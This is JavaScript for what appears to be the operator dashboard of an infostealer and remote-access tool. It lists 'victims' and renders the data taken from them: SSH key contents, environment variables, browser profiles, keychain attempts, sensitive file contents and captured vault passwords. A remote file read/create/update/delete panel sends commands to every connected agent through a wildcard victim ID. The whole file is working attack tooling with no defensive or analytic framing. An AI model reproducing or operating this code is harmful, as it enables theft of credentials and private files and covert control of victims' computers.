let allData = { victims: [], vaultPasswords: [] };
let selectedIndex = -1;
let currentView = 'pretty';
let autoRefresh = false;
let refreshTimer = null;
let prevVictimCount = 0;

function esc(str) {
  if (typeof str !== 'string') str = String(str == null ? '' : str);
  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function syntaxHighlight(json) {
  json = esc(json);
  return json.replace(/("(\\u[a-zA-Z0-9]{4}|\\[^"]|[^\\"])*")(\s*:)?/g, function(match, p1, p2, p3) {
    var cls = 'json-string';
    if (p3) { cls = 'json-key'; }
    return '<span class="' + cls + '">' + (p3 ? p1 + p3 : p1) + '</span>';
  }).replace(/\b(true|false)\b/g, '<span class="json-bool">$1</span>')
    .replace(/\bnull\b/g, '<span class="json-null">null</span>')
    .replace(/\b(-?\d+\.?\d*([eE][+-]?\d+)?)\b/g, '<span class="json-number">$1</span>');
}

function formatBytes(b) {
  if (!b || b === 0) return '0 B';
  var k = 1024;
  var sizes = ['B','KB','MB','GB'];
  var i = Math.floor(Math.log(b) / Math.log(k));
  return parseFloat((b / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

function timeAgo(ts) {
  if (!ts) return 'N/A';
  var diff = Date.now() - new Date(ts).getTime();
  var secs = Math.floor(diff / 1000);
  if (secs < 5) return 'Just now';
  if (secs < 60) return secs + 's ago';
  var mins = Math.floor(secs / 60);
  if (mins < 60) return mins + 'm ago';
  var hrs = Math.floor(mins / 60);
  if (hrs < 24) return hrs + 'h ago';
  return Math.floor(hrs / 24) + 'd ago';
}

async function fetchData() {
  try {
    var resp = await fetch('/api/victims');
    var newData = await resp.json();
    if (newData.victims.length > prevVictimCount && prevVictimCount >= 0) {
      selectedIndex = newData.victims.length - 1;
    }
    prevVictimCount = newData.victims.length;
    allData = newData;
    updateUI();
  } catch(e) { console.error('Fetch error:', e); }
}

function updateUI() {
  document.getElementById('statVictims').textContent = allData.victims.length;
  document.getElementById('statLastSeen').textContent = allData.victims.length > 0 ? timeAgo(allData.victims[allData.victims.length-1].timestamp) : 'N/A';
  document.getElementById('statVault').textContent = allData.vaultPasswords.length;

  var sel = document.getElementById('victimSelect');
  sel.innerHTML = '';
  if (allData.victims.length === 0) {
    sel.innerHTML = '<option value="-1">— No victims yet —</option>';
    selectedIndex = -1;
  } else {
    allData.victims.forEach(function(v, i) {
      var opt = document.createElement('option');
      opt.value = i;
      opt.textContent = (v.victimId || 'unknown') + ' (' + timeAgo(v.timestamp) + ')';
      sel.appendChild(opt);
    });
    if (selectedIndex < 0 || selectedIndex >= allData.victims.length) {
      selectedIndex = allData.victims.length - 1;
    }
    sel.value = selectedIndex;
  }

  document.getElementById('emptyState').style.display = allData.victims.length === 0 ? 'block' : 'none';

  if (allData.victims.length > 0) {
    var d = allData.victims[selectedIndex].data || {};
    var cats = Object.keys(d).filter(function(k) {
      var v = d[k];
      if (v == null) return false;
      if (Array.isArray(v) && v.length === 0) return false;
      if (typeof v === 'object' && !Array.isArray(v) && Object.keys(v).length === 0) return false;
      return true;
    });
    document.getElementById('statCategories').textContent = cats.length;
    renderPrettyView(d);
    renderCategorizedView(d);
    renderRawView(d);
  } else {
    document.getElementById('statCategories').textContent = '0';
    document.getElementById('viewPretty').innerHTML = '';
    document.getElementById('viewCategorized').innerHTML = '';
    document.getElementById('viewRaw').innerHTML = '';
  }

  renderVault();
}

function renderPrettyView(d) {
  var html = '';

  if (d.system && Object.keys(d.system).length > 0) {
    html += '<div class="section-title">📊 System Information</div>';
    html += '<table class="pretty-table"><tr><th>Property</th><th>Value</th></tr>';
    var sysKeys = ['platform','osType','osRelease','kernel','arch','hostname','username','cpuModel','cpuCores','totalRAM','freeRAM','uptime','nodeVersion','pid','cwd','homeDir'];
    for (var ki = 0; ki < sysKeys.length; ki++) {
      var k = sysKeys[ki];
      if (d.system[k] !== undefined) {
        var val = d.system[k];
        if (k === 'totalRAM' || k === 'freeRAM') val = formatBytes(val);
        if (k === 'uptime') val = Math.floor(val / 3600) + 'h ' + Math.floor((val % 3600) / 60) + 'm';
        html += '<tr><td>' + esc(k) + '</td><td>' + esc(String(val)) + '</td></tr>';
      }
    }
    if (d.system.networkInterfaces) {
      for (var iface in d.system.networkInterfaces) {
        var addrs = d.system.networkInterfaces[iface];
        for (var ai = 0; ai < addrs.length; ai++) {
          var a = addrs[ai];
          html += '<tr><td>net:' + esc(iface) + '</td><td>' + esc(a.address) + ' (' + esc(a.family) + (a.internal ? ', internal' : '') + ')</td></tr>';
        }
      }
    }
    html += '</table>';
  }

  if (d.environment && Object.keys(d.environment).length > 0) {
    var envEntries = Object.entries(d.environment);
    html += '<div class="section-title">🔑 Environment Variables (' + envEntries.length + ')</div>';
    html += '<table class="pretty-table"><tr><th>Variable</th><th>Value (masked)</th></tr>';
    for (var ei = 0; ei < Math.min(envEntries.length, 50); ei++) {
      html += '<tr><td>' + esc(envEntries[ei][0]) + '</td><td>' + esc(String(envEntries[ei][1])) + '</td></tr>';
    }
    if (envEntries.length > 50) html += '<tr><td colspan="2" style="color:#777">... and ' + (envEntries.length-50) + ' more</td></tr>';
    html += '</table>';
  }

  if (d.sshKeys && Object.keys(d.sshKeys).length > 0) {
    html += '<div class="section-title">🔐 SSH Keys (' + Object.keys(d.sshKeys).length + ')</div>';
    html += '<table class="pretty-table"><tr><th>File</th><th>Size</th><th style="width:60%">Content Preview</th></tr>';
    for (var name in d.sshKeys) {
      var info = d.sshKeys[name];
      var preview = info.content ? info.content.substring(0, 120) + (info.content.length > 120 ? '...' : '') : '';
      html += '<tr><td style="color:#fff;font-weight:600">' + esc(name) + '</td><td>' + formatBytes(info.size) + '</td><td style="font-size:0.6rem;color:#888">' + esc(preview) + '</td></tr>';
    }
    html += '</table>';
  }

  if (d.browserProfiles) {
    var chromeCount = (d.browserProfiles.chrome || []).length;
    var ffCount = (d.browserProfiles.firefox || []).length;
    if (chromeCount + ffCount > 0) {
      html += '<div class="section-title">🌐 Browser Profiles</div>';
      if (d.browserProfiles.note) html += '<p style="color:#888;font-size:0.68rem;margin-bottom:8px">⚠️ ' + esc(d.browserProfiles.note) + '</p>';
      html += '<table class="pretty-table"><tr><th>Browser</th><th>File</th><th>Size</th><th>Path</th></tr>';
      (d.browserProfiles.chrome || []).forEach(function(item) {
        html += '<tr><td>Chrome</td><td style="color:#fff;font-weight:600">' + esc(item.file) + '</td><td>' + formatBytes(item.size) + '</td><td style="font-size:0.6rem">' + esc(item.path) + '</td></tr>';
      });
      (d.browserProfiles.firefox || []).forEach(function(item) {
        html += '<tr><td>Firefox</td><td style="color:#fff;font-weight:600">' + esc(item.file) + '</td><td>' + formatBytes(item.size) + '</td><td style="font-size:0.6rem">' + esc(item.path) + '</td></tr>';
      });
      html += '</table>';
    }
  }

  if (d.financeApps && d.financeApps.length > 0) {
    html += '<div class="section-title">💰 Finance Apps Detected (' + d.financeApps.length + ')</div><div>';
    d.financeApps.forEach(function(app) { html += '<span class="app-tag finance">' + esc(app) + '</span>'; });
    html += '</div>';
  }

  if (d.wifiSSIDs && d.wifiSSIDs.length > 0) {
    html += '<div class="section-title">📶 Wi-Fi SSIDs (' + d.wifiSSIDs.length + ')</div>';
    html += '<table class="pretty-table"><tr><th>#</th><th>SSID</th></tr>';
    d.wifiSSIDs.forEach(function(ssid, i) { html += '<tr><td>' + (i+1) + '</td><td>' + esc(ssid) + '</td></tr>'; });
    html += '</table>';
  }

  if (d.keychainAttempt) {
    html += '<div class="section-title">🍎 Keychain Access Attempt</div>';
    html += '<table class="pretty-table"><tr><th>Field</th><th>Value</th></tr>';
    for (var kk in d.keychainAttempt) {
      html += '<tr><td>' + esc(kk) + '</td><td>' + esc(String(d.keychainAttempt[kk])) + '</td></tr>';
    }
    html += '</table>';
  }

  if (d.installedApps && d.installedApps.length > 0) {
    html += '<div class="section-title">📱 Installed Apps (' + d.installedApps.length + ')</div><div>';
    d.installedApps.forEach(function(app) { html += '<span class="app-tag">' + esc(app) + '</span>'; });
    html += '</div>';
  }

  if (d.recentFiles && d.recentFiles.length > 0) {
    html += '<div class="section-title">📄 Recent Files (' + d.recentFiles.length + ')</div>';
    html += '<table class="pretty-table"><tr><th>#</th><th>File Name</th><th>Directory</th></tr>';
    d.recentFiles.forEach(function(f, i) {
      var parts = f.replace(/\\/g, '/').split('/');
      var fname = parts.pop() || f;
      var dir = parts.join('/') || '/';
      html += '<tr><td>' + (i+1) + '</td><td style="color:#fff;font-weight:600;font-size:0.68rem">' + esc(fname) + '</td><td style="font-size:0.62rem;color:#888">' + esc(dir) + '</td></tr>';
    });
    html += '</table>';
  }

  if (d.sensitiveFiles && Object.keys(d.sensitiveFiles).length > 0) {
    html += '<div class="section-title" style="color:#e55;border-color:#333">⚠️ Sensitive Files (' + Object.keys(d.sensitiveFiles).length + ')</div>';
    for (var fpath in d.sensitiveFiles) {
      var finfo = d.sensitiveFiles[fpath];
      html += '<div class="file-card">';
      html += '<div class="fname">' + esc(fpath) + '</div>';
      html += '<div class="fmeta">Size: ' + formatBytes(finfo.size) + (finfo.lineCount ? ' | Lines: ' + finfo.lineCount : '') + '</div>';
      if (finfo.content && finfo.content !== '[File too large]') {
        var fpreview = finfo.content.substring(0, 2000) + (finfo.content.length > 2000 ? '\n... (' + finfo.content.length + ' chars total)' : '');
        html += '<div class="fcontent">' + esc(fpreview) + '</div>';
      }
      html += '</div>';
    }
  }

  document.getElementById('viewPretty').innerHTML = html;
}

function renderCategorizedView(d) {
  var sections = [
    { key: 'system', icon: '📊', label: 'System Information' },
    { key: 'environment', icon: '🔑', label: 'Environment Variables' },
    { key: 'sshKeys', icon: '🔐', label: 'SSH Keys' },
    { key: 'browserProfiles', icon: '🌐', label: 'Browser Profiles' },
    { key: 'keychainAttempt', icon: '🍎', label: 'Keychain Attempt' },
    { key: 'financeApps', icon: '💰', label: 'Finance Apps' },
    { key: 'wifiSSIDs', icon: '📶', label: 'Wi-Fi SSIDs' },
    { key: 'installedApps', icon: '📱', label: 'Installed Apps' },
    { key: 'recentFiles', icon: '📄', label: 'Recent Files' },
    { key: 'sensitiveFiles', icon: '⚠️', label: 'Sensitive Files' },
  ];

  var html = '';
  for (var si = 0; si < sections.length; si++) {
    var sec = sections[si];
    var val = d[sec.key];
    if (val == null) continue;
    var count = 0;
    var isEmpty = false;
    if (Array.isArray(val)) { count = val.length; isEmpty = count === 0; }
    else if (typeof val === 'object') { count = Object.keys(val).length; isEmpty = count === 0; }
    else { count = 1; }

    var badge = isEmpty
      ? '<span class="badge badge-yellow">empty</span>'
      : '<span class="badge badge-green">' + count + (Array.isArray(val) ? ' items' : ' keys') + '</span>';

    html += '<details' + (sec.key === 'system' ? ' open' : '') + '>';
    html += '<summary>' + sec.icon + ' ' + sec.label + badge + '</summary>';
    html += '<div class="details-content"><pre>' + esc(JSON.stringify(val, null, 2)) + '</pre></div>';
    html += '</details>';
  }

  document.getElementById('viewCategorized').innerHTML = html;
}

function renderRawView(d) {
  var json = JSON.stringify(d, null, 2);
  document.getElementById('viewRaw').innerHTML =
    '<details open><summary>{ } Full JSON Data <span class="badge badge-green">' + json.length + ' chars</span></summary>' +
    '<div class="raw-json-block"><pre>' + syntaxHighlight(json) + '</pre></div></details>';
}

function renderVault() {
  var vp = allData.vaultPasswords || [];
  if (vp.length === 0) { document.getElementById('vaultSection').innerHTML = ''; return; }
  var html = '<div class="vault-section"><h2>🔑 Captured Vault Passwords (' + vp.length + ')</h2>';
  for (var vi = 0; vi < vp.length; vi++) {
    var v = vp[vi];
    html += '<div class="vault-entry">' +
      '<span class="pw">🔓 ' + esc(v.password || '') + '</span>' +
      '<span class="meta">Victim: ' + esc(v.victimId || '') + '</span>' +
      '<span class="meta">Folder: ' + esc(v.folder || '') + '</span>' +
      '<span class="meta">Files: ' + (v.fileCount || 0) + '</span>' +
      '<span class="meta">' + timeAgo(v.timestamp) + '</span>' +
      '</div>';
  }
  html += '</div>';
  document.getElementById('vaultSection').innerHTML = html;
}

function switchView(view) {
  currentView = view;
  document.querySelectorAll('.view-panel').forEach(function(p) { p.classList.remove('active'); });
  document.querySelectorAll('.tab-btn:not(.refresh-btn)').forEach(function(b) { b.classList.remove('active'); });
  document.getElementById('view' + view.charAt(0).toUpperCase() + view.slice(1)).classList.add('active');
  document.getElementById('tab' + view.charAt(0).toUpperCase() + view.slice(1)).classList.add('active');
}

function toggleAutoRefresh() {
  autoRefresh = !autoRefresh;
  var btn = document.getElementById('btnRefresh');
  if (autoRefresh) {
    btn.textContent = '⟳ Auto-Refresh: ON';
    btn.classList.add('on');
    fetchData();
    refreshTimer = setInterval(fetchData, 3000);
  } else {
    btn.textContent = '⟳ Auto-Refresh: OFF';
    btn.classList.remove('on');
    if (refreshTimer) clearInterval(refreshTimer);
    refreshTimer = null;
  }
}

document.getElementById('victimSelect').addEventListener('change', function() {
  selectedIndex = parseInt(this.value);
  if (selectedIndex >= 0) updateUI();
});

fetchData();

// ─── Remote CRUD Operations ─────────────────────────────────────────────────

// Show/hide content textarea based on action
document.getElementById('cmdAction').addEventListener('change', function() {
  var wrap = document.getElementById('cmdContentWrap');
  wrap.style.display = (this.value === 'create' || this.value === 'update') ? 'block' : 'none';
});

async function issueCommand() {
  var action = document.getElementById('cmdAction').value;
  var filePath = document.getElementById('cmdPath').value.trim();
  var content = document.getElementById('cmdContent').value;
  var statusEl = document.getElementById('cmdStatus');

  if (!filePath) {
    statusEl.innerHTML = '<span style="color:#ff6666;">⚠ Please enter a file path</span>';
    return;
  }

  // Always use wildcard — any connected agent will pick it up
  var victimId = '*';

  statusEl.innerHTML = '<span style="color:#888;">⏳ Sending command...</span>';

  try {
    var resp = await fetch('/api/issue-command', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ victimId: victimId, action: action, path: filePath, content: content }),
    });
    var data = await resp.json();
    if (data.success) {
      statusEl.innerHTML = '<span style="color:#66ff66;">✓ Command queued: ' + esc(data.commandId) + '</span>';
      document.getElementById('cmdPath').value = '';
      document.getElementById('cmdContent').value = '';
      // Start polling for results
      pollCommandResult(data.commandId);
    } else {
      statusEl.innerHTML = '<span style="color:#ff6666;">✗ ' + esc(data.error || 'Failed') + '</span>';
    }
  } catch (e) {
    statusEl.innerHTML = '<span style="color:#ff6666;">✗ Network error: ' + esc(e.message) + '</span>';
  }
}

function pollCommandResult(commandId) {
  var polls = 0;
  var maxPolls = 30; // 30 seconds max
  var timer = setInterval(async function() {
    polls++;
    try {
      var resp = await fetch('/api/command-history');
      var data = await resp.json();
      // Check if this command completed
      var found = data.queue.find(function(c) { return c.commandId === commandId; });
      if (found && (found.status === 'completed' || found.status === 'failed')) {
        clearInterval(timer);
        renderCommandHistory(data.queue);
      }
    } catch (e) { /* ignore */ }
    if (polls >= maxPolls) clearInterval(timer);
  }, 1000);

  // Also refresh history immediately
  fetchCommandHistory();
}

async function fetchCommandHistory() {
  try {
    var resp = await fetch('/api/command-history');
    var data = await resp.json();
    renderCommandHistory(data.queue);
  } catch (e) { /* ignore */ }
}

function renderCommandHistory(queue) {
  var el = document.getElementById('cmdHistory');
  if (!queue || queue.length === 0) {
    el.innerHTML = '';
    return;
  }

  // Show most recent first, max 20
  var items = queue.slice().reverse().slice(0, 20);
  var html = '<h3 style="color:#888;font-size:0.8rem;margin:15px 0 8px 0;">📜 Command History</h3>';

  items.forEach(function(cmd) {
    var statusIcon = '⏳';
    var statusColor = '#888';
    if (cmd.status === 'completed') { statusIcon = '✅'; statusColor = '#66ff66'; }
    else if (cmd.status === 'failed') { statusIcon = '❌'; statusColor = '#ff6666'; }
    else if (cmd.status === 'processing') { statusIcon = '⚡'; statusColor = '#ffaa00'; }

    var actionLabel = { read: '📖 READ', create: '📝 CREATE', update: '✏️ UPDATE', delete: '🗑️ DELETE' };

    html += '<div style="background:#1a1a1a;border:1px solid #333;border-radius:3px;padding:10px;margin-bottom:6px;font-size:0.75rem;">';
    html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:5px;">';
    html += '<span style="color:#e0e0e0;">' + statusIcon + ' <strong>' + (actionLabel[cmd.action] || cmd.action) + '</strong> <code style="color:#aaa;">' + esc(cmd.path) + '</code></span>';
    html += '<span style="color:' + statusColor + ';">' + esc(cmd.status) + '</span>';
    html += '</div>';

    if (cmd.result) {
      var isError = cmd.status === 'failed';
      html += '<div style="background:#111;border:1px solid #222;padding:8px;border-radius:2px;margin-top:5px;max-height:200px;overflow-y:auto;">';
      html += '<pre style="color:' + (isError ? '#ff6666' : '#ccc') + ';white-space:pre-wrap;word-break:break-all;font-size:0.7rem;margin:0;">' + esc(cmd.result) + '</pre>';
      html += '</div>';
    }

    html += '<div style="color:#555;font-size:0.65rem;margin-top:4px;">' + esc(cmd.commandId || '') + ' • ' + esc(cmd.timestamp || '') + '</div>';
    html += '</div>';
  });

  el.innerHTML = html;
}

// Load command history on page load
fetchCommandHistory();

// Refresh command history every 3 seconds
setInterval(fetchCommandHistory, 3000);

